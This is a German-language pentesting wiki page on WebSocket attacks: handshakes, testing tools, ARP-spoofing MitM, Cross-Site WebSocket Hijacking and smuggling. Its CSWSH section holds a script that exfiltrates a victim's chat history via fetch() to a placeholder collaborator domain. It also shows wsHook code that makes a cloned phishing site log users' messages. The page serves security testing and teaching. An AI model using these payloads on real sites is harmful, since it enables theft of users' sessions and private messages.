# WebSocket-Angriffe

{{#include ../banners/hacktricks-training.md}}

## Was sind WebSockets

WebSocket-Verbindungen werden durch einen initialen **HTTP**-Handshake hergestellt und sind darauf ausgelegt, **langfristig** zu bestehen, was bidirektionale Nachrichtenübermittlung zu jeder Zeit ohne die Notwendigkeit eines transaktionalen Systems ermöglicht. Dies macht WebSockets besonders vorteilhaft für Anwendungen, die **geringe Latenz oder serverinitiierte Kommunikation** erfordern, wie z. B. Live-Finanzdatenströme.

### Einrichtung von WebSocket-Verbindungen

Eine detaillierte Erklärung zur Einrichtung von WebSocket-Verbindungen kann [**hier**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) aufgerufen werden. Zusammenfassend werden WebSocket-Verbindungen normalerweise über clientseitiges JavaScript initiiert, wie unten gezeigt:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Das `wss`-Protokoll bezeichnet eine WebSocket-Verbindung, die mit **TLS** gesichert ist, während `ws` eine **unsichere** Verbindung anzeigt.

Während der Verbindungsherstellung wird ein Handshake zwischen dem Browser und dem Server über HTTP durchgeführt. Der Handshake-Prozess umfasst das Senden einer Anfrage durch den Browser und die Antwort des Servers, wie in den folgenden Beispielen dargestellt:

Der Browser sendet eine Handshake-Anfrage:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Server-Antwort auf das Handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Die Verbindung bleibt nach der Herstellung für den Nachrichtenaustausch in beide Richtungen offen.

**Wichtige Punkte des WebSocket-Handshakes:**

- Die `Connection`- und `Upgrade`-Header signalisieren den Beginn eines WebSocket-Handshakes.
- Der `Sec-WebSocket-Version`-Header gibt die gewünschte WebSocket-Protokollversion an, normalerweise `13`.
- Ein Base64-kodierter zufälliger Wert wird im `Sec-WebSocket-Key`-Header gesendet, um sicherzustellen, dass jeder Handshake einzigartig ist, was hilft, Probleme mit Caching-Proxys zu verhindern. Dieser Wert dient nicht der Authentifizierung, sondern um zu bestätigen, dass die Antwort nicht von einem falsch konfigurierten Server oder Cache generiert wurde.
- Der `Sec-WebSocket-Accept`-Header in der Antwort des Servers ist ein Hash des `Sec-WebSocket-Key`, der die Absicht des Servers verifiziert, eine WebSocket-Verbindung zu öffnen.

Diese Funktionen stellen sicher, dass der Handshake-Prozess sicher und zuverlässig ist und den Weg für eine effiziente Echtzeitkommunikation ebnet.

### Linux-Konsole

Sie können `websocat` verwenden, um eine rohe Verbindung mit einem Websocket herzustellen.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Oder um einen websocat-Server zu erstellen:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket-Verbindungen

Wenn Sie feststellen, dass Clients von Ihrem aktuellen lokalen Netzwerk aus mit einem **HTTP websocket** verbunden sind, könnten Sie einen [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)versuchen, um einen MitM-Angriff zwischen dem Client und dem Server durchzuführen.\
Sobald der Client versucht, sich zu verbinden, können Sie dann Folgendes verwenden:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets Enumeration

Sie können das **Tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **verwenden, um automatisch bekannte** **Schwachstellen** in Websockets zu entdecken, zu identifizieren und zu suchen.

### Websocket Debug-Tools

- **Burp Suite** unterstützt MitM-Websockets-Kommunikation auf eine sehr ähnliche Weise, wie es für reguläre HTTP-Kommunikation der Fall ist.
- Die [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite-Erweiterung** ermöglicht es Ihnen, Websocket-Kommunikationen in Burp besser zu verwalten, indem Sie die **Historie** abrufen, **Abfangregeln** festlegen, **Match- und Ersetzungsregeln** verwenden, **Intruder** und **AutoRepeater** nutzen.
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Kurz für "**WebSocket/Socket.io Proxy**", dieses in Node.js geschriebene Tool bietet eine Benutzeroberfläche, um **Nachrichten zu erfassen, abzufangen, benutzerdefinierte** Nachrichten zu senden und alle WebSocket- und Socket.IO-Kommunikationen zwischen dem Client und dem Server anzuzeigen.
- [**wsrepl**](https://github.com/doyensec/wsrepl) ist ein **interaktives Websocket REPL**, das speziell für Penetrationstests entwickelt wurde. Es bietet eine Schnittstelle zur Beobachtung **eingehender Websocket-Nachrichten und zum Senden neuer**, mit einem benutzerfreundlichen Framework zur **Automatisierung** dieser Kommunikation.&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) ist eine **Webseite zur Kommunikation** mit anderen Webseiten über **Websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) bietet unter anderem eine **Webseite zur Kommunikation** mit anderen Webseiten über **Websockets.**

## Websocket Labor

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) haben Sie einen Code, um eine Webseite mit Websockets zu starten, und in [**diesem Beitrag**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) finden Sie eine Erklärung.

## Cross-Site WebSocket Hijacking (CSWSH)

**Cross-Site WebSocket Hijacking**, auch bekannt als **Cross-Origin WebSocket Hijacking**, wird als ein spezifischer Fall von **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** identifiziert, der WebSocket-Handshakes betrifft. Diese Schwachstelle tritt auf, wenn WebSocket-Handshakes ausschließlich über **HTTP-Cookies** ohne **CSRF-Token** oder ähnliche Sicherheitsmaßnahmen authentifiziert werden.

Angreifer können dies ausnutzen, indem sie eine **bösartige Webseite** hosten, die eine Cross-Site-WebSocket-Verbindung zu einer anfälligen Anwendung initiiert. Folglich wird diese Verbindung als Teil der Sitzung des Opfers mit der Anwendung behandelt, wodurch die fehlende CSRF-Schutzmaßnahme im Sitzungsmanagement ausgenutzt wird.

### Einfache Attacke

Beachten Sie, dass beim **Herstellen** einer **Websocket**-Verbindung das **Cookie** an den Server **gesendet** wird. Der **Server** könnte es verwenden, um jeden **spezifischen** **Benutzer** mit seiner **Websocket**-**Sitzung basierend auf dem gesendeten Cookie** zu **verknüpfen**.

Wenn der **Websocket**-**Server** dann beispielsweise die **Historie der Konversation** eines Benutzers zurücksendet, wenn eine Nachricht mit "**READY"** gesendet wird, dann wird eine **einfache XSS**, die die Verbindung herstellt (das **Cookie** wird **automatisch** gesendet, um den Benutzer zu autorisieren), die **Historie der Konversation** **abrufen** können.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie mit einem anderen Subdomain

In diesem Blogbeitrag [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) gelang es dem Angreifer, **willkürliches Javascript in einem Subdomain** der Domain auszuführen, in der die Websocket-Kommunikation stattfand. Da es sich um ein **Subdomain** handelte, wurde das **Cookie** **gesendet**, und da der **Websocket den Origin nicht richtig überprüfte**, war es möglich, mit ihm zu kommunizieren und **Tokens von ihm zu stehlen**.

### Daten von Benutzern stehlen

Kopiere die Webanwendung, die du nachahmen möchtest (die .html-Dateien zum Beispiel), und füge in das Skript, in dem die Websocket-Kommunikation stattfindet, diesen Code hinzu:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Laden Sie jetzt die `wsHook.js`-Datei von [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) herunter und **speichern Sie sie im Ordner mit den Webdateien**.\
Durch das Bereitstellen der Webanwendung und das Herstellen einer Verbindung eines Benutzers damit können Sie die über Websocket gesendeten und empfangenen Nachrichten stehlen:
```javascript
sudo python3 -m http.server 80
```
## Rennbedingungen

Rennbedingungen in WebSockets sind ebenfalls ein Thema, [prüfen Sie diese Informationen, um mehr zu erfahren](race-condition.md#rc-in-websockets).

## Andere Schwachstellen

Da WebSockets ein Mechanismus sind, um **Daten an die Server- und Client-Seite zu senden**, abhängig davon, wie der Server und der Client die Informationen behandeln, **können WebSockets verwendet werden, um mehrere andere Schwachstellen wie XSS, SQLi oder jede andere gängige Web-Schwachstelle unter Verwendung der Eingabe eines Benutzers aus einem Websocket auszunutzen.**

## **WebSocket-Smuggling**

Diese Schwachstelle könnte es Ihnen ermöglichen, **Einschränkungen von Reverse-Proxys zu umgehen**, indem Sie sie glauben lassen, dass eine **Websocket-Kommunikation hergestellt wurde** (auch wenn das nicht wahr ist). Dies könnte einem Angreifer ermöglichen, **auf versteckte Endpunkte zuzugreifen**. Für weitere Informationen überprüfen Sie die folgende Seite:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Referenzen

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
